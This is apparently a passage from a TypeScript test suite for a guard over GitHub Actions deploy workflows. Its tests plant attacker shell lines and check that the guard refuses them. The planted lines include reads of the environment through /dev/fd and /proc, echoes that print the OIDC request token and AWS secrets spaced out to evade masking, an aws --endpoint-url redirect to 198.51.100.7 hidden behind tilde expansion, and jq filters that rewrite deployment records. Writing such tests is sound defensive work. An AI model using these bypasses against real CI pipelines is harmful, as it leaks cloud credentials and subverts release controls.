      expect(canonicalToolLines(line), line).toEqual([])
    }
    // Every command CANONICAL_COMMANDS names is held one way or another: a held tool's line stands whole in its
    // text, and no committed text's line is off its hold.
    for (const [line, text] of TOOL_LINE_TEXTS())
      expect(
        text.split('\n').some(each => each.trim() === line),
        line,
      ).toBe(true)
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(canonicalToolLines(text), name).toEqual([])
    expect(wordSplits('"$a"')).toBe(false)
    expect(wordSplits(`"$(jq -r .a <<<"$b")"`)).toBe(false)
    expect(wordSplits("'*'")).toBe(false)
    expect(wordSplits('$a')).toBe(true)
    expect(wordSplits('x$(y)')).toBe(true)
    expect(wordSplits('*.json')).toBe(true)
    expect(wordSplits('{a,b}')).toBe(true)
  })

  // DPW-07's second layer: the environment through /dev/fd (or /dev/stdin, /dev/stdout, /dev/stderr) is a /proc
  // file as much as /proc/self/environ is.
  it('finds the environment read through /dev/fd in a credentialed run (COMMANDS-A3-01)', () => {
    const PRINTS =
      'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
    const readBack = 'nonprod (Read back what runs)'
    const added = (line: string) =>
      maskingFindings(
        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
      )
    for (const line of ['cat /dev/fd/../environ | mask', 'cat /dev/stdout/../../environ | mask', 'cat /proc | mask']) {
      expect(added(line), line).toEqual([`${DEPLOY}: DPW-07 ${readBack}: ${PRINTS}`])
    }
  })

  // FLOW-A3-01: printf -v with a name built from an expansion ("${kind^^}_TD") set a name no rule that reads
  // assignments saw, so a text could set X=0, overwrite X from a Tasks output that way and evaluate X. A
  // canonical text's printf -v now takes a plain name, TASKS_OUTPUTS sets each kind's definition by name, and
  // no builtin's name is one that chooses what runs.
  it("holds every name a canonical text's builtins set to a plain word, never a loader's (FLOW-A3-01)", () => {
    // The attackers' plant: two names set to 0, one overwritten by a computed printf -v, then evaluated.
    const local = '  local outputs kind definition\n'
    const anchor = `    definition=$(output "$\{kind^}TaskDefinition")\n`
    const computed = `    printf -v "$\{kind^^}_REVISION" '%s' "$\{definition##*:}"`
    expect(TASKS_OUTPUTS).toContain(local)
    expect(TASKS_OUTPUTS).toContain(anchor)
    const planted = TASKS_OUTPUTS.replace(
      local,
      '  local outputs kind definition MIGRATE_REVISION=0 PROBE_REVISION=0\n',
    ).replace(
      anchor,
      `${anchor}${computed}\n    if [ "$(( 999999 < MIGRATE_REVISION + PROBE_REVISION ))" = 1 ]; then\n      exit 1\n    fi\n`,
    )
    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(
      tools('TASKS_OUTPUTS', planted.split('\n').indexOf(computed) + 1),
    )
    expect(canonicalToolLines(`for k in n; do\n  printf -v "$k" '%s' 1\ndone`)).toEqual([1])
    // TASKS_OUTPUTS sets each kind's definition by its name.
    expect(TASKS_OUTPUTS).not.toContain('printf -v')
    expect(TASKS_OUTPUTS).toContain(`migrate) MIGRATE_TD="$\{definition##*/}" ;;`)
    expect(TASKS_OUTPUTS).toContain(`probe) PROBE_TD="$\{definition##*/}" ;;`)
    expect(canonicalToolLines(`printf -v "x" '%s' 1`)).toEqual([0])
    // A name read, mapfile, printf -v or a for loop sets is never PATH, HOME, BASH_ENV or another loader's.
    for (const text of [
      'read -r PATH <<<"$x"',
      `printf -v PATH '%s' "$RUNNER_TEMP/bin"`,
      'for HOME in x; do :; done',
      'mapfile -t BASH_ENV < <(echo x)',
      'IFS= read -r x NODE_OPTIONS <<<"$y"',
    ]) {
      expect(canonicalTextFindings({ X: text }), text).toContain(commands('X', 1))
    }
    expect(canonicalCommandLines(`printf -v X '%s' 1`, new Set())).toEqual([])
  })
})

describe('Round 7, attack 4: the ways past the allowlist (DPW-07, DPW-08, DPW-10, DPW-13)', () => {
  const SHELL = (name: string) => `${GUARD}: DPW-10 ${name}: is written in the shell shellViews() reads`
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const tools = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${TOOLS}`
  const EXPANDS =
    "expands only a name a canonical text sets, one its step's or job's env: gives from no secret or token (but ASSEMBLY_FOLDER, which only an asset check's own calls read), the one-offs' TOKEN, the assembly's folder, prod-plan's diff file, or the runner's outputs, summary, folder, run ids, address and commit, so no canonical text prints the OIDC request token or another credential its job holds"
  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  // TASKS_OUTPUTS with one of its lines replaced by others, and the 1-based line of the first that holds `mark`.
  const OUTPUTS = `  outputs=$(get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Tasks" --query 'Stacks[0].Outputs' --output json)`
  const outputsPlanted = (lines: readonly string[], mark: string) => {
    expect(TASKS_OUTPUTS.split('\n').filter(line => line === OUTPUTS)).toHaveLength(1)
    const planted = TASKS_OUTPUTS.replace(OUTPUTS, lines.join('\n'))
    return { planted, line: planted.split('\n').findIndex(line => line.includes(mark)) + 1 }
  }

  // EXPAND-A4-01: a tilde in a canonical text's aws word. bash expands ~- to $OLDPWD and ~+ to $PWD, so
  // OLDPWD=--endpoint-url then ~- "$endpoint" after --stack-name's value handed aws --endpoint-url, while the
  // guard read ~- as a literal value. An unquoted tilde is now odd to readsAsBash() (but =~'s), an expansion to
  // wordAsRead() and a split to wordSplits(), and PWD and OLDPWD are loaders' names.
  it('reads an unquoted tilde as bash expands it, so no aws word stands for an option it never wrote (EXPAND-A4-01)', () => {
    const { planted, line } = outputsPlanted(
      [
        '  OLDPWD=--endpoint-url',
        '  endpoint=https://198.51.100.7',
        OUTPUTS.replace(' --query', ' ~- "$endpoint" --query'),
      ],
      '~-',
    )
    const found = canonicalTextFindings({ TASKS_OUTPUTS: planted })
    expect(found).toContain(SHELL('TASKS_OUTPUTS'))
    expect(found).toContain(tools('TASKS_OUTPUTS', line))
    // Every form of a tilde bash expands, in an aws word, is refused.
    for (const word of ['~-', '~+', '~', '~root', '--x=~-', 'a:~-']) {
      const aws = `x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks ${word} --output json)`
      expect(canonicalToolLines(aws), word).toEqual([0])
    }
    // ...and in a text, wherever bash expands it: a word's start, a ${…}'s default, a double-quoted replacement.
    for (const text of ['echo ~-', 'x=~+', `echo "$\{x:-~-}"`, `echo "$\{x/a/~}"`, 'x=a:~-']) {
      expect(canonicalTextFindings({ X: text }), text).toContain(SHELL('X'))
    }
    // A quoted tilde, and the =~ operator, stay as they are.
    expect(canonicalTextFindings({ X: `x=$1\nif [[ "$x" =~ ^a$ ]]; then echo "~" '~'; fi` })).toEqual([])
    expect(wordAsRead('~-')).toBe('\0-')
    expect(wordAsRead('"~-"')).toBe('~-')
    expect(wordSplits('~-')).toBe(true)
    expect(wordSplits('"~-"')).toBe(false)
    expect(wordSplits("'~'")).toBe(false)
  })

  // Round 11: brace expansion runs before parameter expansion, so {$,}NAME is $NAME and NAME, and the first then
  // expands a name no rule read as an expansion: printf's arguments, which printfHeld() leaves alone, printed
  // the OIDC request token that way. A $ that ends an alternative is odd to readsAsBash(), and a quoted or
  // escaped one, which bash leaves as it is, and a regex's $ before a blank stay as they were.
  it('reads a $ that ends a brace alternative as the expansion bash makes of it (round 11)', () => {
    const token = ['ACTIONS', 'ID', 'TOKEN', 'REQUEST', 'TOKEN'].join('_')
    for (const text of [
      `printf '"%s"\\n' {$,}${token} | jq -r 'split("") | join(" ")'`,
      `echo {$,}{${token}}`,
      `echo {x,$}${token}`,
      `echo a{b,{$,}}${token}`,
    ]) {
      expect(canonicalTextFindings({ X: text }), text).toContain(SHELL('X'))
      expect(shellViews(text).odd.has('brace'), text).toBe(true)
    }
    for (const text of [
      `echo "{$,}${token}" '{$,}' {\\$,}x`,
      'x=$1\nif [[ "$x" =~ ^[0-9]{1,3}$ ]]; then echo ok; fi',
      'f() {\n  echo "$1"\n}',
    ]) {
      expect(shellViews(text).odd.has('brace'), text).toBe(false)
    }
  })

  // bash ends an unquoted ${ … } at its first } no backslash escapes, a bare { inside being a literal: the reader
  // counted that { too and closed ${mode:-{} a brace later, so in "$(echo ${mode:-{})}" it took the ) that
  // closes the substitution as part of the expansion, read the substitution as still open and a command after it
  // as quoted text. It now closes where bash does, so the command is read and refused.
  it(`closes an unquoted \${ … } at the first } bash closes it at, a bare { inside it opening nothing`, () => {
    const planted = `f() {\n  local mode=x seen\n  seen="$(echo \${mode:-{})}" ;uname -s; : "x)"\n}`
    // (From round 12's third iteration the definition's name is no command: its head stands where a command starts,
    // and the { that ends its line is read as the group's word, as the } that closes it is.)
    expect(shellCommands(planted).map(command => command.word)).toEqual(['{', 'local', 'echo', 'uname', ':', '}'])
    expect(canonicalTextFindings({ X: planted }).join('\n')).toMatch(
      /DPW-10 X, line 3: runs only the commands CANONICAL_COMMANDS names/,
    )
    // A bare { as a default closes at the first }, as a plain expansion does; a nested ${ is still odd.
    for (const text of [`echo \${x:-{}; uname`, `echo \${x}; uname`]) {
      expect(shellViews(text).odd.size, text).toBe(0)
      expect(
        shellCommands(text).map(command => command.word),
        text,
      ).toEqual(['echo', 'uname'])
    }
    expect(shellViews(`echo \${x:-\${y}}; uname`).odd.has('brace')).toBe(true)
  })

  // EXPAND-A4-02: a value after an option's value. awsTextHeld() let any number of values follow an option, so
  // "$where" "$endpoint" after --stack-name's value handed aws --endpoint-url as it ran. Each option now takes
  // one value, and a list option (--services, --names, --tasks) later words that start with no expansion.
  it('hands each aws option one value, and a list later words that start with no expansion (EXPAND-A4-02)', () => {
    const { planted, line } = outputsPlanted(
      [
        '  local where=--endpoint-url endpoint=https://198.51.100.7',
        OUTPUTS.replace(' --query', ' "$where" "$endpoint" --query'),
      ],
      '"$where"',
    )
    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(tools('TASKS_OUTPUTS', line))
    for (const aws of [
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" "$where" "$endpoint" --output json)',
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$task" "$where" --output json)',
      'x=$(get aws ecs describe-services --cluster "$CLUSTER" --services api "$where" --output json)',
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" x --output json)',
    ]) {
      expect(canonicalToolLines(aws), aws).toEqual([0])
    }
    // A list's later words pass, each one a canonical text writes (AWS_CHECK's services, say).
    expect(
      canonicalToolLines(
        'x=$(get aws ecs describe-services --cluster "hearth-$stage" --services "hearth-$stage-api" "hearth-$stage-realtime" --output json)',
      ),
    ).toEqual([])
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(canonicalToolLines(text), name).toEqual([])
  })

  // COMMANDS-A4-01: a record body's jq program, held only token by token, took a filter after the object
  // (| if .environment == "nonprod" then .environment = "prod" …), rewriting the record the job wrote. Every
  // line of a record's writer that sets a name, runs jq or calls gh is now one the guard writes as a literal,
  // never read from the text that holds it.
  it("holds every line of a record's writer that sets a name, runs jq or calls gh to the guard's own (COMMANDS-A4-01)", () => {
    const body = `production_environment: ($environment == "prod"), payload: $payload}')`
    const rewrites = [
      `production_environment: ($environment == "prod"), payload: $payload} | if .environment == "nonprod" then .environment = "prod" | .payload.services = {api: "hearth-prod-api:999999", realtime: "hearth-prod-realtime:999999", worker: "hearth-prod-worker:999999"} else . end')`,
      `production_environment: ($environment == "prod"), payload: $payload} | if .payload.kind == "deploy" then .task = ("hearth-" + "migrated") | .payload = {schema: 1, commit: .payload.commit} else . end')`,
    ]
    for (const stage of ['nonprod', 'prod'] as const) {
      const id = `record-${stage}`
      const run = recordRun(stage)
      expect(unheldRecordLines(id, run), id).toEqual([])
      const at = run.split('\n').findIndex(line => line.includes(body))
      for (const rewrite of rewrites) expect(unheldRecordLines(id, run.replace(body, rewrite))).toEqual([at])
      // The payload, the environment or a record's id set again, or another jq or gh call, is refused too.
      for (const added of [
        `PAYLOAD=$(jq '.services = {}' <<<"$PAYLOAD")`,
        'ENVIRONMENT=prod',
        `gh api "repos/$REPO/deployments" --jq '.[0].id'`,
      ]) {
        const lines = run.split('\n')
        const index = lines.findIndex(line => line.trim().startsWith('PAYLOAD=$(release_payload "$KIND"'))
        expect(index, id).toBeGreaterThanOrEqual(0)
        lines.splice(index + 1, 0, `${/^\s*/.exec(lines[index] ?? '')?.[0] ?? ''}${added}`)
        expect(unheldRecordLines(id, lines.join('\n')), added).toEqual([index + 1])
      }
    }
    // Migrate's own record names its own environment's, from migrate's end on.
    for (const stage of ['nonprod', 'prod'] as const) {
      const run = PINNED_RUNS()[stage]?.Migrate?.run ?? ''
      expect(run).toContain(migrationRecord(stage))
      expect(unheldRecordLines(stage, run)).toEqual([])
      const other = stage === 'nonprod' ? 'prod' : 'nonprod'
      const swapped = run.replace(`--arg environment "${stage}"`, `--arg environment "${other}"`)
      expect(swapped).not.toBe(run)
      expect(unheldRecordLines(stage, swapped)).toHaveLength(1)
    }
    // Through deploy.yml: the plant in record-nonprod's run is found, beside the pin it breaks.
    const RECORD_LINES =
      'sets a name, runs jq or calls gh in a record’s writer only on a line RECORD_JOB_LINES or migrationRecordLines() holds, so nothing rewrites what a record says'
    expect(releaseFindings(plant(body, rewrites[0] ?? '', job('record-nonprod')))).toContain(
      `${DEPLOY}: DPW-13 record-nonprod (Write the record): ${RECORD_LINES}`,
    )
  })

  // COMMANDS-A4-02: an echo added to AWS_CHECK printed the OIDC request token spaced out, which no mask matches,
  // since only a run's own lines were held to the names they may expand. A canonical text now expands only a
  // name a canonical text sets, one an env: gives from no secret or token, or the runner's own.
  it('expands in a canonical text no name its job holds a credential in (COMMANDS-A4-02)', () => {
    const anchor = `  echo 'go=true' >>"$GITHUB_OUTPUT"\n`
    expect(AWS_CHECK).toContain(anchor)
    const echo = `    echo "$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN//?/& }" "$ACTIONS_ID_TOKEN_REQUEST_URL"`
    const planted = AWS_CHECK.replace(
      anchor,
      `  if [ -n "$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN-}" ]; then\n${echo}\n  fi\n${anchor}`,
    )
    const line = planted.split('\n').indexOf(echo) + 1
    expect(line).toBeGreaterThan(0)
    expect(canonicalTextFindings({ AWS_CHECK: planted })).toContain(
      `${GUARD}: DPW-07 AWS_CHECK, line ${line}: ${EXPANDS}`,
    )
    for (const text of [
      'echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"',
      `printf '%s\\n' "$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN:0:8}"`,
      `echo "$\{AWS_SESSION_TOKEN//?/& }"`,
      `echo "$\{#AWS_SECRET_ACCESS_KEY}"`,
      'x="$GH_TOKEN"',
      'echo "$GITHUB_TOKEN"',
      'echo "$ACTIONS_RUNTIME_TOKEN"',
      // A secret an env: hands its step, and a name set to itself, which bash expands first.
      'echo "$ACCOUNT_ID"',
      'ACTIONS_ID_TOKEN_REQUEST_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"; echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"',
      `local t\nt=$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN}`,
    ]) {
      expect(foreignExpansionLines(text, ['t', 'x']).length, text).toBeGreaterThan(0)
    }
    // The runner's own, a step's env, a name a text sets and a jq program's own $name pass.
    for (const text of [
      'echo "$STAGE $RUNNER_TEMP $GITHUB_RUN_ID $GITHUB_SHA"',
      `x=$(jq -n --arg a "$MODE" '$a')`,
      'echo "$stop_token"',
    ]) {
      expect(foreignExpansionLines(text), text).toEqual([])
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // FLOW-A4-01: a [[ … -gt … ]] whose operand held ]] inside a ${…} (${revision// ]] /}, ${x:- ]] }) ended
  // the tempered search before the operator, so the arithmetic was never seen. The operator is now found
  // anywhere after a [[ on its line, and a [[ that stays open is read to its real close, past each ${…}, $( … )
  // and parenthesis.
  it('finds a [[ … ]] comparing as numbers wherever its operand holds ]] (FLOW-A4-01)', () => {
    const loop = `  for kind in migrate probe; do\n    definition=$(output "$\{kind^}TaskDefinition")\n`
    const local = '  local outputs kind definition\n'
    expect(TASKS_OUTPUTS).toContain(loop)
    expect(TASKS_OUTPUTS).toContain(local)
    const test = `    if [[ "$\{revision// ]] /}" -gt 999999 ]]; then`
    const planted = TASKS_OUTPUTS.replace(local, '  local outputs kind definition revision\n').replace(
      loop,
      `${loop}    revision=$\{definition##*:}\n${test}\n      exit 1\n    fi\n`,
    )
    const line = planted.split('\n').indexOf(test)
    expect(line).toBeGreaterThan(0)
    expect(evaluatedLines(planted)).toContain(line)
    for (const text of [
      `x=$1\n[[ "$\{x/ ]] /}" -gt 1 ]]`,
      `x=$1\n[[ "$\{x:- ]] }" -gt 1 ]]`,
      'x=$1\n[[ "$(echo ]] )" -gt 1 ]]',
      'x=$1\n[[ $x =~ ( ]]) || $x -gt 1 ]]',
    ]) {
      expect(evaluatedLines(text), text).toEqual([1])
    }
    // A [[ that doesn't close on its line, wherever a ]]-shaped text stands in it.
    for (const text of [`x=$1\n[[ "$\{x/ ]] /}" ||\n$x -gt 1 ]]`, 'x=$1\n[[ $x =~ ( ]]) ||\n$x -gt 1 ]]']) {
      expect(evaluatedLines(text), text).toContain(1)
    }
    // An outside value compared as a number is refused.
    expect(canonicalTextFindings({ X: `[[ "$\{y/ ]] /}" -gt 1 ]]` })).toContain(
      `${GUARD}: DPW-10 X, line 1: ${EVALUATES}`,
    )
    // A test that closes before a pattern or regex stays as it was.
    expect(evaluatedLines('x=$1\nif [[ "$x" =~ ^(a|b)$ ]]; then echo y; fi')).toEqual([])
    expect(evaluatedLines(`x=$1\n[[ "$x" == a ]] && echo "$\{x}"`)).toEqual([])
  })

  // INPUTS-A4-01: a restore deployed the restore stage's stacks into prod's account behind prod's approval
  // with no diff in any run, so a release's own code could add a grant to prod's task role only when it is
  // rendered for a restore. prod-plan now runs for a restore, diffing the stacks it deploys (restore/* up, its
  // Services, Data and Platform down), and prod-gate, which prod needs, requires prod-plan's success for every
  // target.
  it('diffs what a restore deploys before its approval, as a prod deploy is (INPUTS-A4-01)', () => {
    const planIf = JOB_IFS['prod-plan'] ?? ''
    const gateIf = JOB_IFS['prod-gate'] ?? ''
    const settled = (text: string) => text.replace(/!cancelled\(\)/g, 'true')
    const people = { 'github.triggering_actor': 'person', 'github.actor': 'person' }
    for (const restore of ['up', 'down']) {
      const known = {
        ...people,
        'needs.gate.result': 'success',
        'needs.gate.outputs.target': 'restore',
        'needs.gate.outputs.mode': 'deploy',
        'needs.gate.outputs.restore': restore,
        'needs.synth.result': 'success',
        'needs.synth-previous-prod.result': 'success',
        'needs.smoke-nonprod.result': 'skipped',
      }
      expect(evaluateIf(settled(planIf), known), restore).toBe(true)
      for (const result of ['failure', 'cancelled', 'skipped']) {
        expect(evaluateIf(settled(gateIf), { ...known, 'needs.prod-plan.result': result }), result).toBe(false)
      }
      expect(evaluateIf(settled(gateIf), { ...known, 'needs.prod-plan.result': 'success' })).toBe(true)
    }
    // prod-plan's stage is prod's, so its diff names the stacks prod then deploys; a restore taken down diffs
    // the stacks it deploys, one at a time and in its order (RESTORE_DOWN_DIFF, whose status the run takes),
    // and the summary says what it shows.
    expect(STAGES['prod-plan']).toBe(STAGES.prod)
    expect(DIFF_RUN).toContain('elif [ "$RESTORE" != down ]; then\n')
    expect(DIFF_RUN).toContain(
      `\n${RESTORE_DOWN_DIFF}\nif [ "$DOWN_STATUS" != 0 ]; then STATUS="$DOWN_STATUS"; fi\ncat "$DIFF"\n`,
    )
    expect(RESTORE_DOWN_DIFF).toContain(`for PART in Services Data Platform; do`)
    expect(RESTORE_DOWN_DIFF).toContain(`      ${CDK_DIFF_DOWN}\n`)
    expect(CDK_DIFF_DOWN).toContain('"$STAGE/$PART" --exclusively')
    expect(DIFF_RUN).toContain('if [ "$STAGE" = restore ]; then echo "### What the restore changes"')
    // The workflow as it was before: prod-plan for a prod target alone, prod-gate passing a restore without it.
    const OLD_PLAN =
      "needs.synth-previous-prod.result == 'success' && needs.gate.outputs.target == 'prod' && ((needs.gate.outputs.mode == 'deploy' && needs.smoke-nonprod.result == 'success') || needs.gate.outputs.mode == 'rollback') }}"
    const NEW_PLAN =
      "needs.synth-previous-prod.result == 'success' && ((needs.gate.outputs.target == 'prod' && ((needs.gate.outputs.mode == 'deploy' && needs.smoke-nonprod.result == 'success') || needs.gate.outputs.mode == 'rollback')) || (needs.gate.outputs.target == 'restore' && needs.gate.outputs.mode == 'deploy')) }}"
    const OLD_GATE =
      "((needs.gate.outputs.target == 'prod' && needs.prod-plan.result == 'success') || needs.gate.outputs.target == 'restore') }}"
    const NEW_GATE =
      "(needs.gate.outputs.target == 'prod' || needs.gate.outputs.target == 'restore') && needs.prod-plan.result == 'success' }}"
    const RESTORE_PLAN =
      'prod-plan: runs for a restore, whose prod-gate (and so prod) requires its success, so a restore is approved against its diff'
    expect(prodPathFindings(workflows)).toEqual([])
    for (const planted of [plant(NEW_PLAN, OLD_PLAN, job('prod-plan')), plant(NEW_GATE, OLD_GATE, job('prod-gate'))]) {
      expect(prodPathFindings(planted)).toContain(`${DEPLOY}: DPW-08 ${RESTORE_PLAN}`)
    }
  })

  // ACTIONS-01, ROLLBACK-03 (round 7). A restore taken down skips a stack that doesn't exist, one a failed
  // create left and one whose failed create couldn't roll back, but prod-plan diffed all three, and the CLI
  // diffs a stack that doesn't exist against an empty template, every resource as added: after an up that
  // failed before Services, the approver read a down creating three ECS services, which the runbook's rule
  // has them reject, and a stack whose create waits for review has no template to read, so the diff failed
  // and down could never run. The pinned Diff run, against a stand-in aws that answers each stack's status
  // and a stand-in CLI that names what it diffs, now diffs only what down deploys, names the rest above the
  // diff, and fails only where down would refuse.
  it('diffs only the stacks a restore taken down deploys, as down decides them (ACTIONS-01, ROLLBACK-03, round 7)', () => {
    const scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw08-down-'))
    const diff = (stacks: Readonly<Record<string, string>>, env: Readonly<Record<string, string>> = {}) => {
      const temp = mkdtempSync(join(scratch, 'runner-'))
      const bin = join(temp, 'bin')
      execFileSync('mkdir', ['-p', bin, join(temp, 'aws-cdk', 'package', 'bin'), join(temp, 'stacks')])
      // Each stack's answer: a status, or "!" and an error aws prints before it fails.
      for (const [name, answer] of Object.entries(stacks)) writeFileSync(join(temp, 'stacks', name), answer)
      writeFileSync(
        join(bin, 'aws'),
        [
          '#!/bin/bash',
          `echo "$*" >>'${join(temp, 'aws.log')}'`,
          'case "$*" in *LastUpdatedTime*) basis=yes ;; *) basis=no ;; esac',
          'while [ "$#" -gt 0 ] && [ "$1" != --stack-name ]; do shift; done',
          // PLAN_BASIS's read of the stage before the diff (round 11): a stack there reads as settled, so each
          // case tests RESTORE_DOWN_DIFF's own reading of its status.
          `if [ "$basis" = yes ]; then`,
          `  [ -e '${join(temp, 'stacks')}/'"$2" ] && { echo '["UPDATE_COMPLETE", "2026-11-20T10:00:00Z"]'; exit 0; }`,
          `  echo "An error occurred (ValidationError) when calling the DescribeStacks operation: Stack with id $2 does not exist" >&2; exit 254`,
          'fi',
          `answer=$(cat '${join(temp, 'stacks')}/'"$2" 2>/dev/null || echo '!Stack with id '"$2"' does not exist')`,
          'case "$answer" in',
          `  '!'*) echo "An error occurred (ValidationError) when calling the DescribeStacks operation: \${answer#!}" >&2; exit 254 ;;`,
          '  *) echo "$answer" ;;',
          'esac',
          '',
        ].join('\n'),
        { mode: 0o755 },
      )
      writeFileSync(
        join(temp, 'aws-cdk', 'package', 'bin', 'cdk'),
        [
          '#!/bin/bash',
          `echo "$*" >>'${join(temp, 'cdk.log')}'`,
          'for word in "$@"; do case "$word" in restore/*|prod/*) echo "diff of $word" ;; esac; done',
          `if [ -e '${join(temp, 'fails')}' ]; then exit 3; fi`,
          '',
        ].join('\n'),
        { mode: 0o755 },
      )
      if (env.FAILS === 'true') writeFileSync(join(temp, 'fails'), '')
      writeFileSync(join(temp, 'summary.md'), '')
      writeFileSync(join(temp, 'output'), '')
      const result = spawnSync('bash', ['-c', DIFF_RUN], {
        encoding: 'utf8',
        env: {
          PATH: `${bin}:${process.env.PATH ?? ''}`,
          HOME: temp,
          RUNNER_TEMP: temp,
          GITHUB_STEP_SUMMARY: join(temp, 'summary.md'),
          GITHUB_OUTPUT: join(temp, 'output'),
          STAGE: 'restore',
          MODE: 'deploy',
          RESTORE: 'down',
          ...env,
        },
      })
      const read = (name: string) => (existsSync(join(temp, name)) ? readFileSync(join(temp, name), 'utf8') : '')
      const diffed = read('cdk.log')
        .split('\n')
        .filter(line => line !== '')
        .map(line => line.split(' ').filter(word => /^(?:restore|prod)\//.test(word)))
      return {
        status: result.status,
        diffed,
        summary: read('summary.md'),
        aws: read('aws.log'),
        output: read('output'),
      }
    }
    const skipped = (part: string, why: string) => `restore down: Hearth-restore-${part} ${why}`
    // PLAN_BASIS's read before the diff, which the stand-in answers with each stack there as settled.
    const basisOf = (...there: string[]) =>
      ['Platform', 'Data', 'Tasks', 'Services']
        .map(part => `${part}:${there.includes(part) ? 'UPDATE_COMPLETE@2026-11-20T10:00:00Z' : 'missing'},`)
        .join('')
    const NOT_THERE = "doesn't exist, so down skips it and it isn't diffed"
    const FAILED_CREATE = "is what a failed create left, so down skips it and it isn't diffed"
    try {
      // Every stack there and settled: each diffed alone, in down's order.
      const settled = diff({
        'Hearth-restore-Services': 'UPDATE_COMPLETE',
        'Hearth-restore-Data': 'UPDATE_COMPLETE',
        'Hearth-restore-Platform': 'CREATE_COMPLETE',
      })
      expect(settled.status).toBe(0)
      expect(settled.diffed).toEqual([['restore/Services'], ['restore/Data'], ['restore/Platform']])
      // What it read of each stack is the job's down output, which prod's down holds the stage to.
      expect(settled.output).toBe(
        `basis=${basisOf('Platform', 'Data', 'Services')}\ndown=Services:UPDATE_COMPLETE,Data:UPDATE_COMPLETE,Platform:CREATE_COMPLETE,\n`,
      )
      // An up that failed before Services: Services isn't diffed (so shown as created by no line), but named
      // above the diff, and the other two are.
      const noServices = diff({
        'Hearth-restore-Data': 'UPDATE_COMPLETE',
        'Hearth-restore-Platform': 'UPDATE_COMPLETE',
      })
      expect(noServices.status).toBe(0)
      expect(noServices.diffed).toEqual([['restore/Data'], ['restore/Platform']])
      expect(noServices.output).toBe(
        `basis=${basisOf('Platform', 'Data')}\ndown=Services:missing,Data:UPDATE_COMPLETE,Platform:UPDATE_COMPLETE,\n`,
      )
      const lines = noServices.summary.split('\n')
      const heading = lines.indexOf('### What the restore changes')
      expect(lines.indexOf(skipped('Services', NOT_THERE))).toBeGreaterThanOrEqual(0)
      expect(lines.indexOf(skipped('Services', NOT_THERE))).toBeLessThan(heading)
      expect(lines.slice(heading)).toContain('    diff of restore/Data')
      expect(noServices.summary).not.toContain('restore/Services')
      // A failed create's stacks, waiting for review or rolled back, and one whose rollback failed: none is
      // diffed, the diff passes, and each is named.
      const leftovers = diff({
        'Hearth-restore-Services': 'REVIEW_IN_PROGRESS',
        'Hearth-restore-Data': 'ROLLBACK_COMPLETE',
        'Hearth-restore-Platform': 'ROLLBACK_FAILED',
      })
      expect(leftovers.status).toBe(0)
      expect(leftovers.diffed).toEqual([])
      expect(leftovers.output).toBe(
        `basis=${basisOf('Platform', 'Data', 'Services')}\ndown=Services:REVIEW_IN_PROGRESS,Data:ROLLBACK_COMPLETE,Platform:ROLLBACK_FAILED,\n`,
      )
      expect(leftovers.summary).toContain(skipped('Services', FAILED_CREATE))
      expect(leftovers.summary).toContain(skipped('Data', FAILED_CREATE))
      expect(leftovers.summary).toContain(skipped('Platform', 'is ROLLBACK_FAILED'))
      expect(leftovers.summary).not.toContain('The diff failed')
      // A stack still moving, or one that can't be read, fails the diff as it would fail down, and nothing
      // after it is diffed; a diff that fails fails the step with its own status.
      const moving = diff({
        'Hearth-restore-Services': 'UPDATE_COMPLETE',
        'Hearth-restore-Data': 'UPDATE_IN_PROGRESS',
        'Hearth-restore-Platform': 'UPDATE_COMPLETE',
      })
      expect(moving.status).toBe(1)
      expect(moving.diffed).toEqual([['restore/Services']])
      expect(moving.output).not.toContain('down=')
      expect(moving.summary).toContain(skipped('Data', 'is UPDATE_IN_PROGRESS, which down refuses, so the diff fails'))
      expect(moving.summary).toContain('The diff failed (exit 1), so this plan fails')
      const unread = diff({ 'Hearth-restore-Services': '!Access denied' })
      expect(unread.status).toBe(1)
      expect(unread.diffed).toEqual([])
      expect(unread.summary).toContain(skipped('Services', "can't be read, so the diff fails"))
      expect(unread.output).not.toContain('down=')
      // A status of no stack's shape (a line break and another output, say) fails the diff and writes nothing.
      const odd = diff({ 'Hearth-restore-Services': 'UPDATE_COMPLETE\ngo=true' })
      expect(odd.status).toBe(1)
      expect(odd.diffed).toEqual([])
      expect(odd.summary).toContain(skipped('Services', "can't be read, so the diff fails"))
      expect(odd.output).not.toContain('down=')
      const failing = diff(
        {
          'Hearth-restore-Services': 'UPDATE_COMPLETE',
          'Hearth-restore-Data': 'UPDATE_COMPLETE',
          'Hearth-restore-Platform': 'UPDATE_COMPLETE',
        },
        { FAILS: 'true' },
      )
      expect(failing.status).toBe(3)
      expect(failing.diffed).toEqual([['restore/Services']])
      expect(failing.summary).toContain('The diff failed (exit 3), so this plan fails')
      // Every other diff reads no stack's status but PLAN_BASIS's read of the stage before it (round 11), which
      // is its basis output: a restore up diffs every restore stack, a prod rollback its Tasks and Services, a
      // prod deploy every prod stack, each in one call. A taken-down restore reads it too, before its own reads
      // (round 11).
      expect(settled.aws.trim().split('\n').slice(0, 4)).toEqual(
        ['Platform', 'Data', 'Tasks', 'Services'].map(
          part =>
